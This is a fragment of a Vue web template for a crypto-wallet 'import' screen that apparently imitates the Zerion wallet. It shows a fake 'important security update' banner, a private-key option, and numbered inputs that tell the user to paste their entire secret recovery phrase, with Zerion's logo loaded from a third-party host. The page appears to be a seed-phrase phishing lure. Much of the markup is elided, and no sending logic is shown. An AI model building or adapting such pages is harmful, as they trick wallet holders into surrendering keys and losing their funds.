            ...
            <div class="flex flex-col p-6">
              ...
              <div class="w-full mt-[20px]">
                ...
                <p class="text-gray-300 mt-1 font-semibold text-[14px] mb-8">
                  Self-custody for your DeFi portfolio
                </p>
                <div
            ...
            <div class="flex flex-col p-6">
              ...
              <div class="w-full mt-[20px]">
                ...
                <div class="rounded-lg p-4" :style="{ background: accentBg }">
                  ...
                  >
                    Important security update recommended for optimal
                    experience.
                  </div>
                </div>
                <div class="mt-[30px]">
          ...
          >
            ...
            <div class="flex gap-3 mb-4">
              <button
                ...
                :class="[
                  'px-4 py-3 rounded-full  font-semibold border',
            ...
            >
              ...
              <p class="text-sm font-semibold text-gray-300 m-0">
                Paste your entire secret phrase into any field or type
                word-by-word.
              </p>
            </div>
            ...
            <div v-if="importType === 'private'" class="mt-2">
              ...
              <div class="flex gap-3 mt-2">
                <button
                  ...
                  :disabled="isLoading"
                  class="flex-1 font-bold text-[14px] border-none text-white py-4 px-4 rounded-[30px] transition-colors duration-200 disabled:opacity-50 disabled:cursor-not-allowed"
                  :style="{ background: primaryColor }"
                >
            ...
            <div v-else class="mt-2 h-[400px] overflow-scroll">
              <div class="grid grid-cols-3 gap-3 mt-4">
                <div v-for="n in phraseCount" :key="n" class="relative">
                  <span
                    class="absolute left-2 top-2 text-gray-400 text-sm select-none"
                    >{{ n }}</span
                  >
                  <div class="relative">
                    <input
...
const logoUrl =
  "https://s.rivalsense.co/media/logos/zerion.io.png";
